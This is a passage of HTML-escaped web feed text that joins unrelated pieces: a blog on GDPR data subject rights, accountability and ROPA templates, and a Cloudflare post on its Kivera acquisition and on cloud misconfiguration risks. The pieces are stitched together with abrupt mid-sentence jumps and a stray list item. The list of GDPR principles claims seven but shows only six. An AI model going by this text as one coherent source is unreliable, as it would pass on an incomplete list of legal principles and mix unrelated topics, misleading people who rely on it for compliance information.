&lt;li&gt;Where the processing is carried out by “automated means”.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Put differently, they can only exercise it where the transfer is “technically feasible” (Article 20(2)).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-object"&gt;7. The right to object (Article 21)&lt;/h2&gt;



&lt;p&gt;Article 21(1) of the GDPR says:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;The data subject shall have the right to object, on grounds relating to his or her particular situation, at any time to processing of personal data concerning him or her which is based on points (e) or (f) of Article 6(1) [to perform a task in the public interest or for a legitimate interest], including profiling based on those provisions.&lt;/p&gt;



&lt;p&gt;The controller shall no longer process the personal data unless the controller demonstrates compelling legitimate grounds for the processing which override the interests, rights and freedoms of the data subject or for the establishment, exercise or defence of legal claims.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Article 21(2) also specifies that data subjects can object to their data being used for &lt;a href="https://www.itgovernance.co.uk/green-papers/gdpr-and-pecr-a-guide-for-marketers" rel="noreferrer noopener" target="_blank"&gt;direct marketing&lt;/a&gt; purposes “at any time” – meaning that this is an absolute right.&lt;/p&gt;



&lt;p&gt;Where someone objects to a processing activity, and you can’t provide good grounds for overriding that objection, you must stop that processing (but you can keep the data if you’re using it for a different, lawful activity).&lt;/p&gt;



&lt;p&gt;Whether or not you comply with a data subject exercising their right to object, you must inform them of your decision within one month of receiving the objection.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Rights-related-to-automated-decision-making-including-profiling"&gt;8. Rights related to automated decision-making, including profiling (Article 22)&lt;/h2&gt;



&lt;p&gt;People have the right not to be subject to any &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-automated-decision-making-and-profiling-what-are-the-requirements" rel="noreferrer noopener" target="_blank"&gt;automated decision-making&lt;/a&gt; with potentially legal or similarly significant consequences for them, unless:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;You need to conduct the processing to enter into a contract with the data subject;&lt;/li&gt;



&lt;li&gt;You’re required or authorised by law to conduct the processing; or&lt;/li&gt;



&lt;li&gt;The data subject has explicitly consented to the processing.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Where you may proceed with the processing, you must:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Inform the data subject about the processing;&lt;/li&gt;



&lt;li&gt;Enable them to easily request human intervention or challenge a decision; and&lt;/li&gt;



&lt;li&gt;Regularly review your systems to make sure they’re working as intended.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;The key to compliance with emerging technologies&lt;/li&gt;

&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt; outlines seven key principles relating to the processing of personal data.&lt;/p&gt;



&lt;p&gt;These are often referred to as ‘data protection principles’ or ‘data processing principles’.&lt;/p&gt;



&lt;p&gt;The principles are:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Lawfulness, fairness and transparency&lt;/li&gt;



&lt;li&gt;Purpose limitation&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/what-is-data-minimisation-definition-examples" rel="noreferrer noopener" target="_blank"&gt;Data minimisation&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Accuracy&lt;/li&gt;



&lt;li&gt;Storage limitation&lt;/li&gt;

&lt;li&gt;Accountability&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Among organisations that believe themselves GDPR compliant – and among those that don’t – accountability is often the weak link.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-is-accountability"&gt;What is accountability?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Are-your-measures-effective"&gt;Are your measures effective?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Why-GDPR-accountability-is-important"&gt;Why GDPR accountability is important&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Making-accountability-easy:-Q&amp;amp;A-with-Andrew-Snow"&gt;Making accountability easy: Q&amp;amp;A with Andrew Snow&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#ROPA-(record-of-processing-activities)-template"&gt;ROPA (record of processing activities) template&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Automate-your-GDPR-compliance"&gt;Automate your GDPR compliance&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-is-accountability"&gt;What does ‘accountability’ mean under the GDPR?&lt;/h2&gt;



&lt;p&gt;The GDPR says in Article 5(2) that &lt;a href="https://www.itgovernance.co.uk/blog/data-controller-vs-data-processor-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;data controllers&lt;/a&gt; must be able to demonstrate compliance with the other six principles. Though the GDPR doesn’t give a formal definition for ‘accountability’, its meaning is clear:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;You must be able to &lt;em&gt;prove&lt;/em&gt; compliance.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;This isn’t &lt;em&gt;just&lt;/em&gt; a key GDPR requirement, subject to the higher-tier &lt;a href="https://www.itgovernance.co.uk/dpa-and-gdpr-penalties" rel="noreferrer noopener" target="_blank"&gt;fines&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Meeting this principle ensures an overall approach to data security and privacy that’s effective at addressing your risks, as well as giving you a better return on investment on your measures.&lt;/p&gt;



&lt;p&gt;Accountability means being able to show your personal data processing activities are secure and GDPR compliant.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Are-your-measures-effective"&gt;Are your measures effective?&lt;/h2&gt;



&lt;p&gt;As evident from the many &lt;a href="https://www.itgovernance.co.uk/blog/free-expert-insights" rel="noreferrer noopener" target="_blank"&gt;conversations&lt;/a&gt; I have with subject-matter experts, organisations tend to implement measures and then forget about them.&lt;/p&gt;



&lt;p&gt;But you implement a control to &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;address a risk&lt;/a&gt; and bring it down to an acceptable level.&lt;/p&gt;



&lt;p&gt;You can’t, however, stop there.&lt;/p&gt;



&lt;p&gt;First, confirm that the &lt;strong&gt;control is effective&lt;/strong&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Did you implement it correctly, or does it require fine-tuning to get the result you want? Check that your money (and time) were well spent.&lt;/li&gt;



&lt;li&gt;Was the control the best risk treatment option you had? Don’t forget, as with many aspects in business, you make decisions based on your best guess only. There’s no shame in finding out you’re wrong, but that’s no excuse for &lt;em&gt;staying&lt;/em&gt; wrong.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Second, &lt;strong&gt;risks aren’t static&lt;/strong&gt; – especially in a world where digital information is prevalent. Cyber threats and vulnerabilities are constantly changing, and risks change with them.&lt;/p&gt;



&lt;p&gt;Organisations change, too. Over time, you’ll modify the way you do things – bring in a new system, for example, or amend the way you conduct a certain activity. You may even go through a major change like a merger or an acquisition.&lt;/p&gt;



&lt;p&gt;In short, a measure that’s effective today may not be so effective a few months from now.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Why-GDPR-accountability-is-important"&gt;Why do we need accountability under the GDPR?&lt;/h2&gt;



&lt;p&gt;The above is why accountability under the GDPR is so important.&lt;/p&gt;



&lt;p&gt;It transforms GDPR compliance from a box-ticking exercise into a catalyst to improve the way you operate as a business. It means you’re:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Managing your risks better – not just to your data subjects (customers, employees, etc.), but also to your organisation;&lt;/li&gt;



&lt;li&gt;Keeping track of what data you’re collecting and why, and destroying data you’re not using or no longer need; and&lt;/li&gt;



&lt;li&gt;Making your processes more efficient and have more confidence in your data.&lt;/li&gt;
&lt;/ul&gt;







&lt;p&gt;It’s the difference between creating a &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPA (record of processing activities)&lt;/a&gt; as a one-off exercise, and turning that ROPA into a type of asset register of true business value to your organisation.&lt;/p&gt;



&lt;p&gt;It’s the difference between just creating &lt;a href="https://www.itgovernance.co.uk/blog/the-documents-you-need-to-comply-with-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;policies and procedures&lt;/a&gt;, and also generating records that’ll tell you that your processes are working and show a regulator – and other stakeholders – that you are, indeed, GDPR compliant.&lt;/p&gt;



&lt;p&gt;The accountability principle entails these types of differences.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Making-accountability-easy:-Q&amp;amp;A-with-Andrew-Snow"&gt;How to be accountable under the GDPR&lt;/h2&gt;



&lt;p&gt;One approach is explore the ICO’s (Information Commissioner’s Office) &lt;a href="https://ico.org.uk/media/for-organisations/documents/2619653/accountability-tracker-202104.xlsm" rel="noreferrer noopener" target="_blank"&gt;accountability tracker&lt;/a&gt; and/or &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/accountability-and-governance/accountability-framework/navigating-the-accountability-framework/" rel="noreferrer noopener" target="_blank"&gt;accountability framework&lt;/a&gt;. As the UK’s supervisory authority, this is a natural place to start for UK organisations.&lt;/p&gt;



&lt;p&gt;But is there a simpler way of showing accountability?&lt;/p&gt;



&lt;p&gt;I sat down with Andrew ‘Andy’ Snow, our &lt;a href="https://www.itgovernance.co.uk/gdpr-training" rel="noreferrer noopener" target="_blank"&gt;data privacy trainer&lt;/a&gt; and a &lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;DPO (data protection officer)&lt;/a&gt;, to find out.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How would you approach GDPR accountability?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Well, accountability means that you need to be able to point at a [personal data] processing activity and say:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; is [this].&lt;/li&gt;



&lt;li&gt;We’re ensuring purpose limitation like [this].&lt;/li&gt;



&lt;li&gt;We’re ensuring accuracy like [this].&lt;/li&gt;



&lt;li&gt;We’re securing data like [this].&lt;/li&gt;



&lt;li&gt;And so on.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Having clear answers when questioned about anything related to the data protection principles is a good place to start. It shows you’ve thought about the principles and how you’re meeting them.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How can organisations address the data protection principles in a practical way?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I’d start with your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Article 30 ROPAs&lt;/a&gt;. We’ve previously talked about how you can make them your focal point of GDPR compliance by using them as a ‘one-stop shop’.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;[You can read the full interview Andy is referring to &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;here&lt;/em&gt;&lt;/a&gt;&lt;em&gt;.]&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;This is precisely how I’ve approached my own ROPA template. I’ve tried to make it a more relevant document for organisations by putting all useful information in one place – not just what the GDPR lists in Article 30, but also cover:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Accountability;&lt;/li&gt;



&lt;li&gt;How you’ll cater for data subject rights; and&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-six-key-stages-of-the-data-protection-impact-assessment-dpia" rel="noreferrer noopener" target="_blank"&gt;DPIA&lt;/a&gt; [data protection impact assessment] information.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;I also use it for data flow information and as a risk register. Those aren’t explicit GDPR requirements, but having that information handy certainly helps you meet other legal and regulatory requirements and keep data secure.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How does using your ROPA like that help keep personal data secure?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Because, if you don’t know what data you have, where it’s going, or what risks are associated with it, how can you possibly protect it? For that matter, how can your business processes be maximally effective?&lt;/p&gt;



&lt;p&gt;But if you keep that information together – the kind you’d want to regularly use in day-to-day activities, not just document then forget about – accountability becomes part of business as usual without too much effort, once you’ve put together those ROPAs.&lt;/p&gt;



&lt;p&gt;This approach to ROPAs also provides a ‘single source of truth’. It’s like version control in an ISMS [information security management system, ideally aligned to &lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;ISO 27001&lt;/a&gt;].&lt;/p&gt;



&lt;p&gt;If you scatter your documentation, and someone updates a document in one location but not in another, how will you establish which is correct? Will people even realise that there are two [or more] versions of that document?&lt;/p&gt;



&lt;p&gt;Whereas if everyone defaults to their ROPA to check the &lt;a href="https://www.itgovernance.co.uk/blog/top-tips-for-data-retention-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;retention period&lt;/a&gt;, which also contains hyperlinks to the documented consent, DPIA, etc., that makes for a considerably more coherent approach.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can you share your ROPA template with us?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Of course! Trainees regularly ask for a copy, which I’m happy to share – I hope it gives people a good starting point.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;[We’ve recreated Andy’s template below.]&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Thanks a lot, Andy. My final question: for those looking to further automate compliance, or who aren’t keen on spreadsheets, is &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;CyberComply&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; a good solution for demonstrating GDPR accountability?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;It most certainly is, but it’ll take buy-in from management for it to work. Without that buy-in, no solution will work in the long run – accountability is something that needs to be baked into the organisation’s culture, which has to come from management.&lt;/p&gt;



&lt;p&gt;The organisation must be accountable for every processing activity. It must have due regard for all risks associated with its processing activities.&lt;/p&gt;



&lt;p&gt;So, if you &lt;em&gt;don’t&lt;/em&gt; have an Article 30 ROPA, and you’re &lt;em&gt;not&lt;/em&gt; tracking all these processing activities, how do you even &lt;em&gt;understand&lt;/em&gt; the risks from specific activities? [A specific responsibility of the &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead" rel="noreferrer noopener" target="_blank"&gt;DPO or data privacy lead&lt;/a&gt;.]&lt;/p&gt;



&lt;p&gt;Accountability needs to be embedded into everything organisations do. Again, it’s having that one-stop shop.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="ROPA-(record-of-processing-activities)-template"&gt;Free ROPA template&lt;/h2&gt;



&lt;p&gt;&lt;em&gt;Andy’s ROPA template doesn’t fit (legibly) into one screenshot. Instead, we’ve replicated his Excel-based template in segments, which you can easily tailor to suit your needs.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Tips:&lt;/em&gt;&lt;/strong&gt;&lt;em&gt; Colour-coding your risks (e.g. green/amber/red to indicate low/medium/high risk) is a good idea. Excel formulas to automatically calculate risks can also speed up this process.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;Make sure you &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/how-to-manage-your-cyber-risks#Define-risk" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;clearly define&lt;/em&gt;&lt;/a&gt;&lt;em&gt; what a ‘low’, ‘medium’ or ‘high’ risk is for a consistent approach across the organisation.&lt;/em&gt;&lt;/p&gt;

This acquisition extends our SASE portfolio to incorporate inline cloud app controls, empowering &lt;a href="https://www.cloudflare.com/zero-trust/"&gt;&lt;u&gt;Cloudflare One&lt;/u&gt;&lt;/a&gt; customers with preventative security controls for all their cloud services.&lt;/p&gt;&lt;p&gt;In today’s digital landscape, cloud services and SaaS (software as a service) apps have become indispensable for the daily operation of organizations. At the same time, the amount of data flowing between organizations and their cloud providers has ballooned, increasing the chances of data leakage, compliance issues, and worse, opportunities for attackers. Additionally, many companies — especially at enterprise scale — are working directly with multiple cloud providers for flexibility based on the strengths, resiliency against outages or errors, and cost efficiencies of different clouds. &lt;/p&gt;&lt;p&gt;Security teams that rely on &lt;a href="https://www.cloudflare.com/learning/cloud/what-is-cspm/"&gt;&lt;u&gt;Cloud Security Posture Management (CSPM)&lt;/u&gt;&lt;/a&gt; or similar tools for monitoring cloud configurations and permissions and Infrastructure as code (IaC) scanning are falling short due to detecting issues only after misconfigurations occur with an overwhelming volume of alerts. The combination of Kivera and Cloudflare One puts preventive controls directly into the deployment process, or ‘inline’, blocking errors before they happen. This offers a proactive approach essential to protecting cloud infrastructure from evolving cyber threats, maintaining data security, and accelerating compliance. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;An early warning system for cloud security risks &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#an-early-warning-system-for-cloud-security-risks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;In a significant leap forward in cloud security, the combination of Kivera’s technology and Cloudflare One adds preventive, inline controls to enforce secure configurations for cloud resources. By inspecting cloud API traffic, these new capabilities equip organizations with enhanced visibility and granular controls, allowing for a proactive approach in mitigating risks, managing cloud security posture, and embracing a streamlined DevOps process when deploying cloud infrastructure.&lt;/p&gt;&lt;p&gt;Kivera will add the following capabilities to Cloudflare’s &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-sase/"&gt;&lt;u&gt;SASE&lt;/u&gt;&lt;/a&gt; platform:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;One-click security:&lt;/b&gt; Customers benefit from immediate prevention of the most common cloud breaches caused by misconfigurations, such as accidentally allowing public access or policy inconsistencies.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Enforced cloud tenant control:&lt;/b&gt; Companies can easily draw boundaries around their cloud resources and tenants to ensure that sensitive data stays within their organization. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Prevent data exfiltration:&lt;/b&gt; Easily set rules to prevent data being sent to unauthorized locations.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Reduce ‘shadow’ cloud infrastructure:&lt;/b&gt; Ensure that every interaction between a customer and their cloud provider is in line with preset standards. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Streamline cloud security compliance:&lt;/b&gt; Customers can automatically assess and enforce compliance against the most common regulatory frameworks.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Flexible DevOps model:&lt;/b&gt; Enforce bespoke controls independent of public cloud setup and deployment tools, minimizing the layers of lock-in between an organization and a cloud provider.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Complementing other cloud security tools:&lt;/b&gt; Create a first line of defense for cloud deployment errors, reducing the volume of alerts for customers also using CSPM tools or Cloud Native Application Protection Platforms (CNAPPs). &lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7nALx5Qv8FBYxn1R6RkUvX/1b3dddb60d9d85142a9fda82d2eee381/BLOG-2592_2.png" /&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;As a SASE platform, Cloudflare One ensures safe access and provides data controls for cloud and SaaS apps. This integration broadens the scope of Cloudflare’s SASE platform beyond user-facing applications to incorporate increased cloud security through proactive configuration management of infrastructure services, beyond what CSPM and &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-casb/"&gt;&lt;u&gt;CASB&lt;/u&gt;&lt;/a&gt; solutions provide. With the addition of Kivera to Cloudflare One, customers now have a unified platform for all their inline protections, including cloud control, access management, and threat and data protection. All of these features are available with single-pass inspection, which is &lt;a href="https://blog.cloudflare.com/network-performance-update-cio-edition/?_ga=2.241337794.1947644748.1710771073-1224524116.1709647459"&gt;&lt;u&gt;50% faster&lt;/u&gt;&lt;/a&gt; than &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-secure-web-gateway/"&gt;&lt;u&gt;Secure Web Gateway (SWG)&lt;/u&gt;&lt;/a&gt; alternatives.  &lt;/p&gt;&lt;p&gt;With the earlier &lt;a href="https://blog.cloudflare.com/cloudflare-acquires-bastionzero/"&gt;&lt;u&gt;acquisition of BastionZero&lt;/u&gt;&lt;/a&gt;, a Zero Trust infrastructure access company, Cloudflare One expanded the scope of its VPN replacement solution to cover infrastructure resources as easily as it does apps and networks. Together Kivera and BastionZero enable centralized security management across hybrid IT environments, and provide a modern DevOps-friendly way to help enterprises connect and protect their hybrid infrastructure with Zero Trust best practices.&lt;/p&gt;&lt;p&gt;Beyond its SASE capabilities, Cloudflare One is integral to &lt;a href="https://www.cloudflare.com/connectivity-cloud/"&gt;&lt;u&gt;Cloudflare’s connectivity cloud&lt;/u&gt;&lt;/a&gt;, enabling organizations to consolidate IT security tools on a single platform. This simplifies secure access to resources, from developer privileged access to technical infrastructure and expanding cloud services. As &lt;a href="https://www.cloudflare.com/lp/forrester-wave-sse-2024/"&gt;&lt;u&gt;Forrester echoes&lt;/u&gt;&lt;/a&gt;, “Cloudflare is a good choice for enterprise prospects seeking a high-performance, low-maintenance, DevOps-oriented solution.”&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The cloud has become a prime target for cyberattacks. According to the &lt;a href="https://www.crowdstrike.com/resources/reports/crowdstrike-2023-cloud-risk-report-executive-summary/"&gt;&lt;u&gt;2023 Cloud Risk Report&lt;/u&gt;&lt;/a&gt;, CrowdStrike observed a 95% increase in cloud exploitation from 2021 to 2022, with a staggering 288% jump in cases involving threat actors directly targeting the cloud.&lt;/p&gt;&lt;p&gt;Misconfigurations in cloud infrastructure settings, such as improperly set security parameters and default access controls, provide adversaries with an easy path to infiltrate the cloud. According to the &lt;a href="https://cpl.thalesgroup.com/sites/default/files/content/cloud-security/2024/2024-thales-cloud-security-study-global-edition.pdf"&gt;&lt;u&gt;2023 Thales Global Cloud Security Study&lt;/u&gt;&lt;/a&gt;, which surveyed nearly 3,000 IT and security professionals from 18 countries, 44% of respondents reported experiencing a data breach, with misconfigurations and human error identified as the leading cause, accounting for 31% of the incidents.&lt;/p&gt;&lt;p&gt;Further, according to Gartner&lt;sup&gt;Ⓡ&lt;/sup&gt;, “Through 2027, 99% of records compromised in cloud environments will be the result of user misconfigurations and account compromise, not the result of an issue with the cloud provider.”&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Several factors contribute to the rise of cloud misconfigurations:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Rapid adoption of cloud services:&lt;/b&gt; Leaders are often driven by the scalability, cost-efficiency, and ability to support remote work and real-time collaboration that cloud services offer. These factors enable rapid adoption of cloud services which can lead to unintentional misconfigurations as IT teams struggle to keep up with the pace and complexity of these services. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Complexity of cloud environments:&lt;/b&gt; Cloud infrastructure can be highly complex with multiple services and configurations to manage. For example, &lt;a href="https://public.docs.kivera.io/docs/access-analyzer"&gt;&lt;u&gt;AWS alone offers&lt;/u&gt;&lt;/a&gt; 373 services with 15,617 actions and 140,000+ parameters, making it challenging for IT teams to manage settings accurately. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Decentralized management:&lt;/b&gt; In large organizations, cloud infrastructure resources are often managed by multiple teams or departments. Without centralized oversight, inconsistent security policies and configurations can arise, increasing the risk of misconfigurations.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Continuous Integration and Continuous Deployment (CI/CD):&lt;/b&gt; CI/CD pipelines promote the ability to rapidly deploy, change and frequently update infrastructure. With this velocity comes the increased risk of misconfigurations when changes are not properly managed and reviewed.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Insufficient training and awareness:&lt;/b&gt; Employees may lack the cross-functional skills needed for cloud security, such as understanding networks, identity, and service configurations. This knowledge gap can lead to mistakes and increases the risk of misconfigurations that compromise security.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Common exploitation methods &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#common-exploitation-methods"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Threat actors exploit cloud services through various means, including targeting misconfigurations, abusing privileges, and bypassing encryption. Misconfigurations such as exposed storage buckets or improperly secured APIs offer attackers easy access to sensitive data and resources. Privilege abuse occurs when attackers gain unauthorized access through compromised credentials or poorly managed identity and access management (IAM) policies, allowing them to escalate their access and move laterally within the cloud environment. Additionally, unencrypted data enables attackers to intercept and decrypt data in transit or at rest, further compromising the integrity and confidentiality of sensitive information.&lt;/p&gt;&lt;p&gt;Here are some other vulnerabilities that organizations should address: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Unrestricted access to cloud tenants:&lt;/b&gt; Allowing unrestricted access exposes cloud platforms to &lt;a href="https://www.cloudflare.com/learning/security/what-is-data-exfiltration/"&gt;data exfiltration&lt;/a&gt; by malicious actors. Limiting access to approved tenants with specific IP addresses and service destinations helps prevent unauthorized access.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Exposed access keys:&lt;/b&gt; Exposed access keys can be exploited by unauthorized parties to steal or delete data. Requiring encryption for the access keys and restricting their usage can mitigate this risk.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Excessive account permissions:&lt;/b&gt; Granting excessive privileges to cloud accounts increases the potential impact of security breaches. Limiting permissions to necessary operations helps prevent lateral movement and privilege escalation by threat actors.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Inadequate network segmentation:&lt;/b&gt; Poorly managed network security groups and insufficient segmentation practices can allow attackers to move freely within cloud environments. Drawing boundaries around your cloud resources and tenants ensures that data stays within your organization.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Improper public access configuration:&lt;/b&gt; Incorrectly exposing critical services or storage resources to the internet increases the likelihood of unauthorized access and data compromise. Preventing public access drastically reduces risk.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Shadow cloud infrastructure:&lt;/b&gt; Abandoned or neglected cloud instances are often left vulnerable to exploitation, providing attackers with opportunities to access sensitive data left behind. Preventing untagged or unapproved cloud resources to be created can reduce the risk of exposure.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h2&gt;Limitations of existing tools &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#limitations-of-existing-tools"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
